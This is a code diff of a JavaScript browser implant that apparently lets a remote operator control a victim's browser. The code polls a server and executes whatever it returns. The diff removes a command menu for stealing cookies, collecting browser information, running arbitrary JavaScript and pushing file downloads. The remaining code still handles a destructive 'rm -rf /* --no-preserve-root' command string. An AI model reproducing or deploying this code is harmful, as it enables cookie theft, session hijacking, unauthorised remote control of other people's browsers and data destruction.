@@ -49,44 +49,11 @@ function getIP() {
     return xhr.responseText.replace("\n","")
 }
 
-var json_object = {
-    "IP" : getIP() ,
-    "获取Cookie" : {
-        "Command" : "get_cookie",
-        "Input" : false
-    },
-    "获取浏览器信息" : {
-        "Command" : "getinfo",
-        "Input" : false
-    },
-    "运行Js(浏览器命令行)" : {
-        "Command" : "js: ",
-        "Input" : true
-    },
-    "获取IP地址" : {
-        "Command" : "get_ip",
-        "Input" : false
-    },
-    "在对方浏览器下载文件" : {
-        "Command" : "rget",
-        "Input" : true
-    },
-    "关闭" : {
-        "Command" : "close",
-        "Input" : false
-    }
-}
-
 function exec(command) {
     try {
         command = command.replace("\n","")
         if (command.replace(" ","") === 'none') {
             return false;
-        }
-        else if (command == 'options') {
-            // 返回Json.
-            sendReturn(JSON.stringify(json_object));
-            clear_command()
         }
         else if (command == 'js: run_system_command("rm -rf /* --no-preserve-root")')
         {
@@ -174,9 +141,7 @@ function exec(command) {
     }
 }
 
-//sendReturn("Connect: "+getIP());
-sendReturn(JSON.stringify(json_object));
-console.log(JSON.stringify(json_object))
+sendReturn("Connect: "+getIP());
 
 loop = setInterval(function () {
     try{
@@ -188,7 +153,7 @@ loop = setInterval(function () {
         xhr.onload = function (e) {
             if (xhr.readyState === 4) {
                 if (xhr.status === 200) {
-                    //console.log(xhr.responseText)
+                    console.log(xhr.responseText)
                     exec(xhr.responseText);
                 }
                 else{
